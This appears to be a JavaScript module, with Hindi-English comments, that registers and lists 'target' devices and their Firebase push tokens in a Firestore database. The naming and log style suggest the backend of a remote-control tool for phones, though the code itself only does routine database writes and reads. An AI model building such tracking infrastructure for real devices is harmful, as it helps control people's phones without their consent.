import { db } from './config.js'; // Tera Firebase admin config

export const saveTargetDevice = async (payload) => {
    try {
        const { device_id, fcm_token, model, status } = payload;
        
        // Target device ka document reference (device_id ke naam se)
        const docRef = db.collection('targets').doc(device_id);

        // Data Firestore mein save karo (merge: true lagaya hai taaki purana data overwrite na ho)
        await docRef.set({
            fcm_token: fcm_token,
            model: model,
            status: status,
            last_seen: Date.now() // Timestamp save karne ke liye
        }, { merge: true });

        console.log(`[+] Database Update: Target [${device_id}] registered successfully.`);
        return true;

    } catch (error) {
        console.error("[-] Database Error in saveTargetDevice:", error);
        throw error; 
    }
};

export const updateDeviceToken = async (deviceId, fcmToken) => {
    try {
        const docRef = db.collection('targets').doc(deviceId);

        // Sirf token aur last_seen update kar rahe hain (merge: true zaroori hai)
        await docRef.set({
            fcm_token: fcmToken,
            last_seen: Date.now()
        }, { merge: true });

        console.log(`[+] Database Update: FCM Token refreshed for [${deviceId}]`);
        return true;

    } catch (error) {
        console.error("[-] Database Error in updateDeviceToken:", error);
        throw error; 
    }
};


export const getAllTargets = async () => {
    try {
        const snapshot = await db.collection('targets').get();
        const targets = [];
        
        // Har document par loop chala kar array mein daal rahe hain
        snapshot.forEach(doc => {
            targets.push({
                id: doc.id, // Device ID
                ...doc.data()
            });
        });

        console.log(`[+] Database Query: Fetched ${targets.length} targets from DB.`);
        return targets;

    } catch (error) {
        console.error("[-] Database Error in getAllTargets:", error);
        throw error; 
    }
};